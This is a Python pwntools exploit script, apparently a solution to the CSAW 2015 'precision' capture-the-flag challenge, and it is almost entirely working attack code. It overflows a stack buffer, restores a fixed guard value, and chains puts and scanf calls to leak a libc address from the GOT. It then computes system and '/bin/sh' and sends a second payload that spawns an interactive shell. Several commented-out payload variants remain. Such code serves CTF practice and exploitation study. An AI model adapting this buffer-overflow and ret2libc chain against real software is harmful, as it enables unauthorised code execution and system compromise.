from pwn import *
import struct

p = process('./precision_csaw2015')

offset = p.recvline()

offset =  int(offset[8:-1], 16)
print hex(offset)
#system = leak - 136106104
#binsh = leak - 134923757

#print hex(system)
#print hex(binsh)

#payload = "A"*offset
payload = 'AAAA'*32

payload += struct.pack("<I", 0x475a31a5)
payload += struct.pack("<I", 0x40501555)
payload += struct.pack("<I", 0x3b031b01)
payload += struct.pack("<I", 0x00000028)
payload += struct.pack("<I", 0x41414141)

putsgot = 0x0804a010
putsplt = 0x080483c0
scanfplt = 0x8048410
payload += struct.pack("<I", putsplt)
payload += struct.pack("<I", 0x0804839d)
payload += struct.pack("<I", putsgot)

payload += struct.pack("<I", scanfplt)
payload += struct.pack("<I", 0x0804851d)
payload += struct.pack("<I", 0x8048682)
payload += struct.pack("<I", offset+16+32*4+20)

'''
payload += struct.pack("<I", putsplt)
payload += struct.pack("<I", 0x0804839d)
payload += struct.pack("<I", system)
'''
'''
scanfplt = 0x08048410
spec = 0x8048682

sys_addr = 0x08049f14

payload += struct.pack("<I", scanfplt)
payload += struct.pack("<I", 0x0804863e)
binsh_addr = 0x08049f20
payload += struct.pack("<I", spec)
payload += struct.pack("<I", sys_addr)

payload += struct.pack("<I", scanfplt)
payload += struct.pack("<I", 0x0804863e)
payload += struct.pack("<I", spec)
payload += struct.pack("<I", binsh_addr)

payload += struct.pack("<I", sys_addr)
payload += struct.pack("<I", 0x41414141)
payload += struct.pack("<I", binsh_addr)


payload += struct.pack("<I", scanfplt)
payload += struct.pack("<I", 0x0804863e)
payload += struct.pack("<I", spec)
payload += struct.pack("<I", binsh_addr)
'''


p.sendline(payload)
p.recvuntil('\n')
leak = struct.unpack("<I", p.recv(4))[0]

print hex(leak)

system = leak - 151296
binsh = leak + 1031051

print hex(system)
print hex(binsh)

#p.sendline(struct.pack("<I", system))
#p.sendline(struct.pack("<I", binsh))
'''
payload2 = 'AAAA'*32

payload2 += struct.pack("<I", 0x475a31a5)
payload2 += struct.pack("<I", 0x40501555)
payload2 += struct.pack("<I", 0x3b031b01)
payload2 += struct.pack("<I", 0x00000028)
payload2 += struct.pack("<I", 0x41414141)
'''
payload2 = struct.pack("<I", system)
payload2 += struct.pack("<I", 0x41414141)
payload2 += struct.pack("<I", binsh)



p.sendline(payload2)

p.interactive()
